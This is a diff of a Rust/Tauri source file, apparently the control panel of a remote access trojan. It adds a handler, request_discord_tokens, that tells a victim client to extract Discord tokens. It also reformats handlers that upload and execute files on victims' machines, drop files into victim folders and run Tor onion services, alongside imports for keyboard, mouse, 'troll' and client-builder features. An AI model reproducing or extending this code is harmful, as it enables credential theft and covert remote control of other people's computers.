@@ -1,12 +1,12 @@
 use crate::handlers::{AssemblyInfo, SharedTauriState};
-use crate::utils::resources::{get_client_built_exe_path, get_exe_dir, get_rcedit_path};
-use std::process::Command;
-use std::sync::Arc;
 use crate::utils::logger::Log;
+use crate::utils::resources::{get_client_built_exe_path, get_exe_dir, get_rcedit_path};
 use base64::{engine::general_purpose, Engine as _};
 use serde::Serialize;
 use std::fs;
-use tauri::{State, Emitter};
+use std::process::Command;
+use std::sync::Arc;
+use tauri::{Emitter, State};
 
 use crate::client::ClientWrapper;
 use crate::commands::ServerCommand;
@@ -15,22 +15,22 @@ use tokio::net::TcpListener;
 use tokio::sync::mpsc;
 use tokio::sync::mpsc::Sender;
 
+use common::packets::TrollCommand;
 use std::ptr::null_mut as NULL;
 use winapi::um::winuser;
-use common::packets::TrollCommand;
 
 use tauri::AppHandle;
 
 use once_cell::sync::OnceCell;
 
 use crate::utils::client_builder::{apply_config, apply_rcedit, open_explorer};
-use common::packets::{
-    KeyboardInputData, MessageBoxData, MouseClickData, Process, RemoteDesktopConfig,
-    VisitWebsiteData, FileData
-};
 use common::client_info::ClientInfo;
+use common::packets::{
+    FileData, KeyboardInputData, MessageBoxData, MouseClickData, Process, RemoteDesktopConfig,
+    VisitWebsiteData,
+};
 
-use crate::utils::tor::{TorManager, OnionServiceInfo};
+use crate::utils::tor::{OnionServiceInfo, TorManager};
 
 pub async fn get_channel_tx(
     tauri_state: State<'_, SharedTauriState>,
@@ -414,6 +414,23 @@ pub async fn request_mic_devices(
 }
 
 #[tauri::command]
+pub async fn request_discord_tokens(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    println!("Tauri handler request_discord_tokens called for {}", addr);
+    send_server_command(
+        ServerCommand::RequestDiscordTokens(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Discord token extraction requested".to_string())
+}
+
+#[tauri::command]
 pub async fn start_mic_live(
     addr: &str,
     device_id: &str,
@@ -657,7 +674,6 @@ pub async fn send_inputbox(
 
     Ok("Inputbox sent".to_string())
 }
-
 
 #[tauri::command]
 pub async fn elevate_client(
@@ -1090,22 +1106,26 @@ pub async fn upload_and_execute(
     addr: &str,
     file_path: &str,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
-    let file_data = fs::read(file_path)
-        .map_err(|e| format!("Failed to read file: {}", e))?;
-    
+    let file_data = fs::read(file_path).map_err(|e| format!("Failed to read file: {}", e))?;
+
     let file_name = std::path::Path::new(file_path)
         .file_name()
         .and_then(|name| name.to_str())
         .unwrap_or("unknown.exe");
-    
+
     let file_data = FileData {
         name: file_name.to_string(),
         data: file_data,
     };
-    
-    send_server_command(ServerCommand::UploadAndExecute(addr.parse().unwrap(), file_data), tauri_state, app_handle).await?;
+
+    send_server_command(
+        ServerCommand::UploadAndExecute(addr.parse().unwrap(), file_data),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("Upload and execute command sent".to_string())
 }
@@ -1115,17 +1135,21 @@ pub async fn execute_file(
     addr: &str,
     file_path: &str,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
-    send_server_command(ServerCommand::ExecuteFile(addr.parse().unwrap(), file_path.to_string()), tauri_state, app_handle).await?;
+    send_server_command(
+        ServerCommand::ExecuteFile(addr.parse().unwrap(), file_path.to_string()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("Execute file command sent".to_string())
 }
 
 #[tauri::command]
 pub async fn read_file_for_upload(file_path: &str) -> Result<Vec<u8>, String> {
-    fs::read(file_path)
-        .map_err(|e| format!("Failed to read file: {}", e))
+    fs::read(file_path).map_err(|e| format!("Failed to read file: {}", e))
 }
 
 #[tauri::command]
@@ -1135,14 +1159,19 @@ pub async fn upload_file_to_folder(
     file_name: &str,
     file_data: Vec<u8>,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
     let file_data = FileData {
         name: file_name.to_string(),
         data: file_data,
     };
-    
-    send_server_command(ServerCommand::UploadFile(addr.parse().unwrap(), target_folder.to_string(), file_data), tauri_state, app_handle).await?;
+
+    send_server_command(
+        ServerCommand::UploadFile(addr.parse().unwrap(), target_folder.to_string(), file_data),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("File upload command sent".to_string())
 }
@@ -1163,7 +1192,11 @@ pub async fn init_tor(
     // Slow path
     let exe_dir = get_exe_dir()?;
     let tor_dir = exe_dir.join("tor_data");
-    let manager = Arc::new(TorManager::new(tor_dir, &app_handle).await.map_err(|e| e.to_string())?);
+    let manager = Arc::new(
+        TorManager::new(tor_dir, &app_handle)
+            .await
+            .map_err(|e| e.to_string())?,
+    );
 
     {
         let mut state = tauri_state.0.lock().unwrap();
@@ -1182,10 +1215,16 @@ pub async fn create_onion(
 ) -> Result<OnionServiceInfo, String> {
     let manager = {
         let state = tauri_state.0.lock().unwrap();
-        state.tor_manager.clone().ok_or("Tor manager not initialized")?
+        state
+            .tor_manager
+            .clone()
+            .ok_or("Tor manager not initialized")?
     };
 
-    manager.create_onion_service(&nickname, port, &app_handle).await.map_err(|e| e.to_string())
+    manager
+        .create_onion_service(&nickname, port, &app_handle)
+        .await
+        .map_err(|e| e.to_string())
 }
 
 #[tauri::command]
@@ -1195,10 +1234,16 @@ pub async fn delete_onion(
 ) -> Result<(), String> {
     let manager = {
         let state = tauri_state.0.lock().unwrap();
-        state.tor_manager.clone().ok_or("Tor manager not initialized")?
+        state
+            .tor_manager
+            .clone()
+            .ok_or("Tor manager not initialized")?
     };
 
-    manager.delete_onion_service(&nickname).await.map_err(|e| e.to_string())
+    manager
+        .delete_onion_service(&nickname)
+        .await
+        .map_err(|e| e.to_string())
 }
 
 #[tauri::command]
